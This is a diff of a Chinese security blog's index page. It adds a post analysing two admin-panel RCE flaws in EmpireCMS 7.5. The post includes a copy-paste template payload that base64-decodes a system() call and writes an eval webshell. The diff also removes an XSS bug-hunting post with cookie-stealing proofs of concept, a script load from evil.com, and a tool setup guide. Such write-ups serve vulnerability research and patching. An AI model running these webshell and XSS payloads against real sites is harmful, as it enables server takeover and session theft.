+<h2 id="后台RCE-增加自定义页面"><a href="#后台RCE-增加自定义页面" class="headerlink" title="后台RCE-增加自定义页面"></a>后台RCE-增加自定义页面</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞挖掘最初来源于qclover师傅:<a href="http://qclover.cn/2018/10/10/EmpireCMS_V7.5%E7%9A%84%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1.html" target="_blank" rel="noopener">EmpireCMS_V7.5的一次审计</a></p>
+<p>但是在这篇复现的文章中还是有一些出入的地方，比如说getshell的具体位置和成因。这里重新跟进分析一下</p>
+<p>首先看一下getshell的流程，这个洞有点像黑盒to白盒<br><img src="http://static.zybuluo.com/1160307775/2r4ccien35hlqw77mo8hrqzj/image_1dje3gco735q1k5m1f11n071a634r.png" alt="image_1dje3gco735q1k5m1f11n071a634r.png-328kB"></p>
+<p>增加页面功能，会在程序根目录生成一个shell.php，访问为phpinfo结果<br><img src="http://static.zybuluo.com/1160307775/2zfoc03cbjv8woa3r5gjme49/image_1djdll0r410dk6ktm7stsgrlm.png" alt="image_1djdll0r410dk6ktm7stsgrlm.png-248.3kB"></p>
+<p>但是在我写入其他木马时，例如<code>&lt;?php @eval($_REQUEST[hpdoger]);?&gt;</code>，根目录却生成了一个空的shell.php文件<br><img src="http://static.zybuluo.com/1160307775/48t49l1j0m30otcu25f646zv/image_1djdlqbum1gj217cp2d61d5f1hi613.png" alt="image_1djdlqbum1gj217cp2d61d5f1hi613.png-56.4kB"></p>
+<p>此时就有些疑问，推测真正的漏洞点应该不是在根目录写入一个php，应该另有它径，这里分析一下漏洞产生的真正成因。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>入口在<code>e/admin/ecmscom.php</code>代码48行，跟进函数<code>AddUserpage</code><br><img src="http://static.zybuluo.com/1160307775/zdc2rmjeup4qfnqr5u9agc3j/image_1djdm53uj1m201n781ncr7ednrr1g.png" alt="image_1djdm53uj1m201n781ncr7ednrr1g.png-431.1kB"></p>
+<p>重点关注两个参数的流程:path、pagetext<br><img src="http://static.zybuluo.com/1160307775/w2r7bolvqfafnju4ndirh0al/image_1djdm8m8l6ve645da3es96c51t.png" alt="image_1djdm8m8l6ve645da3es96c51t.png-535.4kB"></p>
+<p>步入<code>RepPhpAspJspcode</code>函数</p>
+<pre><code>function RepPhpAspJspcode($string){
+    global $public_r;
+    if(!$public_r[candocode]){
+        //$string=str_replace(&quot;&lt;?xml&quot;,&quot;[!--ecms.xml--]&quot;,$string);
+        $string=str_replace(&quot;&lt;\\&quot;,&quot;&amp;lt;\\&quot;,$string);
+        $string=str_replace(&quot;\\&gt;&quot;,&quot;\\&amp;gt;&quot;,$string);
+        $string=str_replace(&quot;&lt;?&quot;,&quot;&amp;lt;?&quot;,$string);
+        $string=str_replace(&quot;&lt;%&quot;,&quot;&amp;lt;%&quot;,$string);
+        if(@stristr($string,&#39; language&#39;))
+        {
+            $string=preg_replace(array(&#39;!&lt;script!i&#39;,&#39;!&lt;/script&gt;!i&#39;),array(&#39;&amp;lt;script&#39;,&#39;&amp;lt;/script&amp;gt;&#39;),$string);
+        }
+        //$string=str_replace(&quot;[!--ecms.xml--]&quot;,&quot;&lt;?xml&quot;,$string);
+    }
+    return $string;
+}</code></pre><p>这个函数用来对pagetext参数进行了php标签的实体化，但是empirecms默认<code>public_r[candocode]</code>为null，所以这里相当于直接返回了原始pagetext的值</p>
+<p>继续回到<code>AddUserpage</code>函数，接着步入<code>ReUserpage</code>函数，在e/class/functions.php的4281行<br><img src="http://static.zybuluo.com/1160307775/gyn1d0txofybrwzm1hu39r1a/image_1djdmv7bv17551oir15kv1do5sg42a.png" alt="image_1djdmv7bv17551oir15kv1do5sg42a.png-298.8kB"></p>
+<p>获取程序的根路径后拼接传入的path，而后DoFileMKDir在根目录建立了shell.php</p>
+<p>接着步入<code>InfoNewsBq</code>函数，也是这个漏洞产生的函数。关键代码在<code>e/class/functions.php</code>的2469-2496行</p>
+<p><img src="http://static.zybuluo.com/1160307775/i3ri8ea5z4g4leh18tid1gig/image_1djdnbjo2pelbn91uh11ks21u8p2n.png" alt="image_1djdnbjo2pelbn91uh11ks21u8p2n.png-496.3kB"></p>
+<p>$file参数以php结尾，通过<code>WriteFiletext</code>函数向$file中写入上一步的pagetext(这里为$indextext)，而<code>WriteFiletext</code>是没有任何过滤的</p>
+<pre><code>function WriteFiletext($filepath,$string){
+    global $public_r;
+    $string=stripSlashes($string);
+    $fp=@fopen($filepath,&quot;w&quot;);
+    @fputs($fp,$string);
+    @fclose($fp);
+    if(empty($public_r[filechmod]))
+    {
+        @chmod($filepath,0777);
+    }
+}</code></pre><p>于是在<code>e/data/tmp</code>目录下，以模版文件的形式写入webshell，同时也将AddCheckViewTempCode()返回的权鉴方法写了进去，所以我们不能直接以url的方式访问这个webshell。<br><img src="http://static.zybuluo.com/1160307775/zp17zrn2j1muego2qa7p9din/image_1djdo4l1d1gte63t1qcb1a73aho4e.png" alt="image_1djdo4l1d1gte63t1qcb1a73aho4e.png-278.6kB"></p>
+<p>但是仍有方法使这个webshell执行并将结果输出。原因在下面这几行<br><img src="http://static.zybuluo.com/1160307775/ecp2rqbzer4w4xk8lw33ghcz/image_1djdnjf5p1b2p1oan4pqn7bd2434.png" alt="image_1djdnjf5p1b2p1oan4pqn7bd2434.png-564.3kB"></p>
+<p>由于入口处定义了常量<code>InEmpireCMS</code>，ob_get_contents可以读取缓冲区的输出，而输出正好是刚才我们包含进去的shell的结果。因此执行了phpinfo()后将要输出到浏览器的内容赋值给了$string变量并返回，在<code>ReUserpage</code>函数中又进行了一次写入，缓冲结果写入的根目录下的shell.php，造成一个表面getshell的现象，其实是一种rce。</p>
+<p><img src="http://static.zybuluo.com/1160307775/ceu2e6w6h3a09qkm8krde4sx/image_1djdnpbbj180fdns1d2h1bvd1neu3h.png" alt="image_1djdnpbbj180fdns1d2h1bvd1neu3h.png-355.3kB"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>设置<code>$public_r[candocode]</code>为true进行写入内容的过滤</p>
+<h2 id="后台首页模版处rce到getshell"><a href="#后台首页模版处rce到getshell" class="headerlink" title="后台首页模版处rce到getshell"></a>后台首页模版处rce到getshell</h2><p>承接上一个漏洞，整个empirecms不少用到ob_get_contents的地方，所以就想挖掘一下还有没有其他可以利用的点，最后把眼光锁在增加模版处。</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在后台模版功能处，选择管理首页模版，然后点击增加首页方案<br><img src="http://static.zybuluo.com/1160307775/92bdlk6m16ygken7p4xw18dj/image_1djp1p7ed1g6q1vs61qof19pb7cjm.png" alt="image_1djp1p7ed1g6q1vs61qof19pb7cjm.png-226.2kB"></p>
+<p>复制下面的payload，填写到模版内容处，点击提交。</p>
+<pre><code>&lt;?php 
+$aa = base64_decode(ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA);
+${(system)($aa)};
+?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/86i5w3sopy8hik249iozojxo/image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png" alt="image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png-311.9kB"></p>
+<p>其中base64编码部分为</p>
+<pre><code>ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA
+=&gt;
+echo &#39;&lt;?php eval($_REQUEST[hp]);&#39;&gt;shell.php</code></pre><p>再点击<strong>启用此方案</strong>即可getshell，在<code>e/admin/template/</code>目录下生成shell.php</p>
+<p><img src="http://static.zybuluo.com/1160307775/jck0izcors9rxr3b8ydk78gf/image_1djp21du0o250ocp31lnuad21t.png" alt="image_1djp21du0o250ocp31lnuad21t.png-64.3kB"><br><img src="http://static.zybuluo.com/1160307775/jeakcfnhj6ljtu09tq4tcsnu/image_1djp23v55qua1pa11b021uir1qmp2a.png" alt="image_1djp23v55qua1pa11b021uir1qmp2a.png-278.2kB"></p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在e/class/functions.php的<code>NewsBq</code>函数中调用<code>WriteFiletext</code>函数向/e/data/tmp/index.php中写入文件并包含<br><img src="http://static.zybuluo.com/1160307775/vngxtn93avtnyhl4ix12mndr/image_1djp2kjth3i01l78dg91q3g1lba2n.png" alt="image_1djp2kjth3i01l78dg91q3g1lba2n.png-588.3kB"></p>
+<p>查找一下哪些地方调用<code>NewsBq</code>函数，最后锁定在<code>e/admin/template/ListIndexpage.php</code>的<code>DefIndexpage</code>中<br><img src="http://static.zybuluo.com/1160307775/w6dlwq628kgerrrfr67flxfq/image_1djp2t8jo6ej1l7t1ui9t9i734.png" alt="image_1djp2t8jo6ej1l7t1ui9t9i734.png-459.9kB"></p>
+<p>首先从库里获取得到<code>$r[temptext]</code>作为参数传入NewsBq，此时<code>$class</code>为null。那么文件内容可控吗？查看一下入库的语句，看看存不存在任意写入，全局搜索<code>enewsindexpage</code></p>
+<p>在同文件ListIndexpage.php的第23行到47行，调用insert语句向<code>enewsindexpage</code>中增加数据，关键代码如下</p>
+<pre><code>function AddIndexpage($add,$userid,$username){
+    global $empire,$dbtbpre;
+    if(!$add[tempname]||!$add[temptext])
+    {
+        printerror(&quot;EmptyIndexpageName&quot;,&quot;history.go(-1)&quot;);
+    }
+    ...
+    $add[tempname]=hRepPostStr($add[tempname],1);
+    $add[temptext]=RepPhpAspJspcode($add[temptext]);
+    $sql=$empire-&gt;query(&quot;insert into {$dbtbpre}enewsindexpage(tempname,temptext) values(&#39;&quot;.$add[tempname].&quot;&#39;,&#39;&quot;.eaddslashes2($add[temptext]).&quot;&#39;);&quot;);
+    ...
+}</code></pre><p>调用AddIndexpage的入口为：</p>
+<pre><code>$enews=$_POST[&#39;enews&#39;];
+if(empty($enews))
+{$enews=$_GET[&#39;enews&#39;];}
+
+if($enews==&quot;AddIndexpage&quot;)
+{
+    AddIndexpage($_POST,$logininid,$loginin);
+}</code></pre><p>所以<code>$add</code>为<code>$_POST</code>获取的数组，经过一次<code>eaddslashes2</code>函数清洗后以temptext字段存入库，而<code>eaddslashes2</code>在内部调用的是addslashes。猜想开发者最初可能只是为了防止sql注入，而没有进行其他类型过滤。但是我们执行任意命令是可以绕过addslashes的限制，取出来temptext字段来rce。</p>
+<p>只需要用到复杂变量：<a href="https://www.jianshu.com/p/7c818ddc5731" target="_blank" rel="noopener">PHP复杂变量绕过addslashes()直接拿shell</a></p>
+<p>整理思路：入库rce语句-&gt;取出库-&gt;写文件-&gt;包含rce-&gt;getshell</p>
+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>对入库语句进行过滤，建议在<code>eaddslashes2</code>中增加一些过滤机制</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/"> 
                     Laravel由destrcuct引起的两处反序列化RCE分析 
                 </a>
@@ -254,7 +813,7 @@ namespace{
             </div>
             <div class="continue">
             <a href="/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -358,7 +917,7 @@ cn/uid:一条记录的名字/ID</code></pre><p>这种树结构非常有利于数
             </div>
             <div class="continue">
             <a href="/2019/08/13/从一次漏洞挖掘入门ldap注入/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -519,7 +1078,7 @@ cn/uid:一条记录的名字/ID</code></pre><p>这种树结构非常有利于数
             </div>
             <div class="continue">
             <a href="/2019/08/10/HTTP Desync Attacks-Smashing into the Cell Next Door/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -631,7 +1190,7 @@ launch</code></pre><p><img src="http://static.zybuluo.com/1160307775/uefh1iezrvi
             </div>
             <div class="continue">
             <a href="/2019/08/06/De1CTF-Giftbox题解/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -708,7 +1267,7 @@ eval($_REQUEST[a]);
             </div>
             <div class="continue">
             <a href="/2019/07/29/CISCN 2019 Final Web11复盘/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -763,7 +1322,7 @@ window[0] ;</code></pre><p>id值是一个全局变量，下例中test这个”id
             </div>
             <div class="continue">
             <a href="/2019/07/02/前端全局变量劫持/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -842,7 +1401,7 @@ $result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</co
             </div>
             <div class="continue">
             <a href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -951,196 +1510,7 @@ with open(&#39;results.txt&#39;,&#39;w&#39;) as file2:
             </div>
             <div class="continue">
             <a href="/2019/04/08/西湖论剑2019-Writeup/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2019/04/05/SRC挖掘初探之随缘XSS挖掘/"> 
-                    SRC挖掘初探之随缘XSS挖掘 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-04-05   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/论坛文章/">论坛文章</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <p>原文首发于先知社区：<a href="https://xz.aliyun.com/t/4625" target="_blank" rel="noopener">https://xz.aliyun.com/t/4625</a></p>
-<p>Author:Hpdoger@D0g3</p>
-<p>最近试着去学挖洞，在测某SRC的一些业务时发现以下几个XSS的点。对于一些请求参数在返回的html中以隐蔽的标签形式出现的XSS，感觉还是挺常见的。这里我写了个Bp的插件用来监听请求并捕获这种情况:<a href="https://github.com/Hpd0ger/SuperTags" target="_blank" rel="noopener">SuperTags</a></p>
-<p>下面的案例和讨论如果有什么片面或错误的地方，还望师傅们斧正</p>
-<h1 id="登陆跳转处XSS"><a href="#登陆跳转处XSS" class="headerlink" title="登陆跳转处XSS"></a>登陆跳转处XSS</h1><p>某处登陆页面看了眼表单，同时跟进事件绑定的对象utils<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093334-a9875eec-5679-1.png" alt="image_1d6vk2rs4g541hq8olo1sf275i1g.png-83kB"></p>
-<p>直接截出登陆验证部分，redata是响应参数，登陆成功为0。host定义为<strong>normal.com</strong>。这里发现其实在登陆的时候是可以存在一个cb参数的(但之前我登陆的时候并没有察觉，因为是后台有个功能loginout，点击才会附带cb参数到登录页)<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac41e300-5679-1.png" alt></p>
-<p>其中,getparam方法如下</p>
-<pre><code>getParam: function(c_name) {
-    var urlParams = location.href;
-    var c_start = urlParams.indexOf(c_name + &quot;=&quot;);銆€
-    if (c_start != -1) {
-        c_start = c_start + c_name.length + 1;銆€
-        c_end = urlParams.indexOf(&quot;&amp;&quot;, c_start);
-        if (c_end == -1) {
-            c_end = urlParams.length;
-        }
-        return urlParams.substring(c_start, c_end);
-    }else{
-        return null;
-    }
-},</code></pre><p>这里开发者还是对cb参数进行了意识形态的过滤，如果cb不包含host则强制重定向首页。但是略鸡肋，直接把host放在注释符后就能绕过。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac53408c-5679-1.png" alt="image_1d6vkg95e1vjv155m1s1n1c7oook3d.png-54.2kB"></p>
-<p>POC：</p>
-<pre><code>cb=javascript:alert(document.cookie);//normal.com</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac649418-5679-1.png" alt="image_1d6vko6a51n64961h1pcd370647.png-127.7kB"></p>
-<h1 id="Image处的XSS"><a href="#Image处的XSS" class="headerlink" title="Image处的XSS"></a>Image处的XSS</h1><p>这是该厂商的一个移动端业务，在我测之前已经有表哥X进去了，看一下这个洞是如何产生的。</p>
-<p>功能点:提交问题反馈，可以上传问题图片<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-ac846cde-5679-1.png" alt="image_1d6vivcc51p0mpm5hb61kgqti29.png-76.5kB"></p>
-<p>漏洞逻辑：<br>上传图片-&gt;提交反馈-&gt;服务端拼接提交的img参数(uri)为img标签src属性的完整地址</p>
-<p>测试上传一个图片后，点击提交反馈并抓包，<code>imglist</code>参数是刚才上传图片返回的uri地址。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093339-aca2a2bc-5679-1.png" alt="image_1d6vj4nch1a5p118b18ci1gu31olam.png-235.9kB"></p>
-<pre><code>POST xxxx?q=index/feedback HTTP/1.1
-
-imglist=%2Cpicture%2F2019%2F02%2F22%2F_a948b4eeaca7420cad9d54fdb0331230.jpg&amp;</code></pre><p>问题就出在拼接标签这部分，修改imglist参数就可以闭合Src属性进行xss,使最终的img标签执行onerror事件</p>
-<p>步骤：抓包修改img路径-&gt;拼接恶意js事件，POC：</p>
-<pre><code>imglist=urlencode(&quot; onerror=&quot;alert(`XSS�`)&quot;&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acc0b540-5679-1.png" alt></p>
-<p>成功弹窗<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-accf7fa8-5679-1.png" alt="image_1d6vjv0dfkis172e1mkpd9b78c13.png-78kB"></p>
-<h1 id="邮件提交处的XSS"><a href="#邮件提交处的XSS" class="headerlink" title="邮件提交处的XSS"></a>邮件提交处的XSS</h1><p>在测试某业务的邮箱密码验证时，发现一个包含请求邮箱的页面。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-acea5b84-5679-1.png" alt="image_1d6vf99vp1smijbq1q9pa1s1sfh2d.png-297.8kB"></p>
-<p>记得之前看过一篇文章，有些服务在发送完邮件后会弹出一个“邮件已发送+email”的页面导致反射型XSS，感觉就是这种了。</p>
-<p>随手测试了一下，发现直接waf了空格、双引号、尖括号，和”&quot;。实体了html编码的尖括号，但是没有实体html编码的双引号。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad08fdbe-5679-1.png" alt="image_1d6vf627h11u1ru6slc13uu1qqt1j.png-337.5kB"></p>
-<p>同时在FUZZ的期间多次出现参数错误的请求，发现可能是应用层做了些过滤：</p>
-<ol>
-<li>email字符串长度&lt;40且@结尾</li>
-<li>不能同时出现两个双引号、括号</li>
-<li>正则alert(1)\prompt(1)\confim…</li>
-</ol>
-<p>不过只要脱离引号就好说，毕竟有很多JS事件可以调。一开始把眼光放在了input标签上测试了一些on事件，发现type是hidden，一些可视on事件都没用的。记得之前看过一个input hidden xss的一个用法是按alt+shift+x触发，poc如下</p>
-<pre><code>urlencode(email=&amp;#34/accesskey=&amp;#34X&amp;#34/onclick=&amp;#34alert&amp;#40&#39;xss&#39;&amp;#41&amp;#34@qq.com)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad17de9c-5679-1.png" alt="image_1d6vfebe9k0q1704vhff8u16cq2q.png-39kB"></p>
-<p>但是这个poc很鸡肋。因为要打出cookie的话长度受限，且利用条件苛刻(firefox+按键)</p>
-<p>回头看了下发现有form标签也有输出点，最初以为form能执行的JS事件就只有reset和submit，后来测试跑onmounseover也能弹框。</p>
-<pre><code>encodeurl(email=&amp;#34/onmouseover=&amp;#34alert&amp;#40document.cookie&amp;#41&amp;#34@qq.com)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad29e16e-5679-1.png" alt="image_1d71n2s5m1mnpvbslfj1iatkg99e.png-70.9kB"></p>
-<h1 id="一个受阻的XSS"><a href="#一个受阻的XSS" class="headerlink" title="一个受阻的XSS"></a>一个受阻的XSS</h1><p>在测试某业务时发现一个有趣的参数拼接点：</p>
-<p>iframe的src拼接url参数+后端给定的第三方host-&gt;iframe加载src</p>
-<p>测试了一下特殊字符都给实体化了，但是又舍不得一个iframe<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093340-ad3e1f30-5679-1.png" alt="image_1d6vl16bn14i9ihun3ovnvnd4k.png-187.5kB"></p>
-<p>经过一番寻找，发现第三方服务的登陆点存在JS跳转漏洞，用iframe加载这个第三方服务的dom-xss也能造成弹框效果<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad523f1a-5679-1.png" alt="image_1d6vleeqr1r4613u81e81cja1m3h5h.png-106.4kB"></p>
-<p>虽然是在SRC业务站点弹的框，但真正的域应该是子页面的。打印一下COOKIE验证，果然是子页面域的cookie。由于waf掉了document.cookie和javascript:alert，我用了html编码的’:’和八进制js编码的’.’绕过，完整打印子页面域payload如下</p>
-<pre><code>https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(document\56cookie)</code></pre><p>在进一步的探索中，我做了两个尝试：</p>
-<ol>
-<li>尝试跳一个外域的JS，看能不能把src属性转到这个js<pre><code>https://src.com?url=redirect_uri%3Dhttps://evil.com/xss.js</code></pre>但是会把资源解析到子页面的document里，而不是src的改变<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad63994a-5679-1.png" alt="image_1d6vm2dvb1ls2185k1hof58miho5u.png-128.4kB"></li>
-</ol>
-<ol start="2">
-<li>iframe是否能调用父页面的事件呢(document)？如果可以的话我们就直接调js uri把cookie打出去。之所以有这个想法是因为，当时寻思既然站点调用这个三方服务了，很大可能性这个三方站是iframe-src白名单。不过测试后发现依然被跨域限制，测试payload<pre><code>https://src.com?url=redirect_uri%3Djavascript%26%23x3A%3Bconsole.log(window.parent.document\56cookie)</code></pre><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190404093341-ad6accec-5679-1.png" alt="image_1d6fi5odbg1pnb7nfdgs7ji6p.png-13.7kB"></li>
-</ol>
-<p>对跨域姿势了解的不多，如果有兴趣的师傅，可以一起来交流一下这种问题</p>
-<h1 id="自闭总结"><a href="#自闭总结" class="headerlink" title="自闭总结"></a>自闭总结</h1><p>从打ctf到学着去挖洞，还是有一些思维出入的地方，慢慢理解之前师傅们说的资产收集的重要性。</p>
-<p>也特别感谢引路人鬼麦子师傅给予的帮助，这里顺便推荐麦子师傅基于爬虫的一款开源子域名监控工具<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">get_domain</a>，在搭建过程中如果遇到环境配置问题，可以参考这篇<a href="http://hpdoger.me/2019/03/30/Ubuntu16.04%E6%90%AD%E5%BB%BA%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1Get_domain/" target="_blank" rel="noopener">Ubuntu16.04-Get_domain搭建手册</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2019/04/05/SRC挖掘初探之随缘XSS挖掘/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2019/03/30/Ubuntu16.04搭建子域名监控服务Get_domain/"> 
-                    Ubuntu16.04-子域名监控工具Getdomain环境搭建 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-03-30   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h1 id="Ubuntu16-04-子域名监控Get-domain环境搭建"><a href="#Ubuntu16-04-子域名监控Get-domain环境搭建" class="headerlink" title="Ubuntu16.04-子域名监控Get_domain环境搭建"></a>Ubuntu16.04-子域名监控Get_domain环境搭建</h1><p>操作环境：Ubuntu16.04<br>数据库：Mongdb<br>项目地址：<a href="https://github.com/guimaizi/get_domain" target="_blank" rel="noopener">https://github.com/guimaizi/get_domain</a></p>
-<h1 id="各种依赖安装"><a href="#各种依赖安装" class="headerlink" title="各种依赖安装"></a>各种依赖安装</h1><pre><code>sudo apt-get install git python3 python3-pip xvfb unzip libxss1 libappindicator1 libindicator7 -y
-
-sudo pip3 install selenium pymongo</code></pre><h1 id="安装mongodb服务端"><a href="#安装mongodb服务端" class="headerlink" title="安装mongodb服务端"></a>安装mongodb服务端</h1><ol>
-<li>添加mongodb签名到APT<pre><code>sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv EA312927</code></pre></li>
-<li>创建/etc/apt/sources.list.d/mongodb-org-3.2.list文件并写入命令<pre><code>echo &quot;deb http://repo.mongodb.org/apt/ubuntu xenial/mongodb-org/3.2 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.2.list</code></pre></li>
-<li>更新软件源列表<pre><code>sudo apt-get update</code></pre></li>
-<li>安装mongodb（默认是安装稳定版）<pre><code>sudo apt-get install -y mongodb-org</code></pre></li>
-</ol>
-<h1 id="配置mongodb服务端"><a href="#配置mongodb服务端" class="headerlink" title="配置mongodb服务端"></a>配置mongodb服务端</h1><ol>
-<li><p>修改配置文件<code>/etc/mongodb.conf</code></p>
-<pre><code>修改后的内容如下：
-bind_ip = 0.0.0.0
-port = 27017
-auth=true (添加帐号,密码认证)</code></pre><p>修改后重启mongodb:sudo service mongodb restart</p>
-</li>
-<li><p>添加超级用户</p>
-<pre><code>use admin
-db.createUser({user:&#39;admin&#39;,pwd:&#39;123456aaa1xsda1A&#39;,roles:[{role:&#39;userAdminAnyDatabase&#39;,db:&#39;admin&#39;}]})
-db.auth(&#39;admin&#39;,&#39;123456aaa1xsda1A&#39;)</code></pre></li>
-<li><p>添加扫描器用户</p>
-<pre><code>use target_domain
-db.createUser({user:&#39;target&#39;,pwd:&#39;123456aaaxsda1A&#39;,roles:[{role:&#39;readWrite&#39;,db:&#39;target_domain&#39;}]})
-db.auth(&#39;target&#39;,&#39;123456aaaxsda1A&#39;)</code></pre></li>
-</ol>
-<h1 id="安装chromedriver"><a href="#安装chromedriver" class="headerlink" title="安装chromedriver"></a>安装chromedriver</h1><p>先安装Chrome浏览器</p>
-<pre><code>sudo apt-get install libxss1 libappindicator1 libindicator7
-wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
-sudo dpkg -i google-chrome*.deb
-sudo apt-get install -f</code></pre><p>再安装chromedriver</p>
-<pre><code>wget -N http://chromedriver.storage.googleapis.com/72.0.3626.7/chromedriver_linux64.zip
-unzip chromedriver_linux64.zip
-chmod +x chromedriver
-sudo mv -f chromedriver /usr/local/share/chromedriver
-sudo ln -s /usr/local/share/chromedriver /usr/local/bin/chromedriver
-sudo ln -s /usr/local/share/chromedriver /usr/bin/chromedriver</code></pre><h1 id="安装go-lang"><a href="#安装go-lang" class="headerlink" title="安装go-lang"></a>安装go-lang</h1><pre><code>$ sudo apt-get update
-$ sudo apt-get -y upgrade
-$ wget https://storage.googleapis.com/golang/go1.7.linux-amd64.tar.gz
-$ sudo tar -xvf go1.7.linux-amd64.tar.gz
-$ sudo mv go /usr/local</code></pre><p>设置gopath</p>
-<pre><code>vim /etc/profile
-export GOROOT=/usr/local/go  #设置为go安装的路径，有些安装包会自动设置默认的goroot
-export GOPATH=$HOME/gocode   #默认安装包的路径
-export PATH=$PATH:$GOROOT/bin:$GOPATH/bin
-source /etc/profile</code></pre><p>go env看一下是否设置成功</p>
-<h1 id="设置Python默认为Python3"><a href="#设置Python默认为Python3" class="headerlink" title="设置Python默认为Python3"></a>设置Python默认为Python3</h1><p>文章：<a href="https://blog.csdn.net/u011534057/article/details/51615193" target="_blank" rel="noopener">https://blog.csdn.net/u011534057/article/details/51615193</a></p>
-<p>使用文章的第二种方法：在系统级修改 Python 版本</p>
-<h1 id="下载subfinder"><a href="#下载subfinder" class="headerlink" title="下载subfinder"></a>下载subfinder</h1><pre><code>go get github.com/subfinder/subfinder</code></pre><p>报错没关系，只要文件里有bin src就行</p>
-<h1 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h1><p>见<a href="http://www.guimaizi.com/archives/360的启动说明" target="_blank" rel="noopener">http://www.guimaizi.com/archives/360的启动说明</a></p>
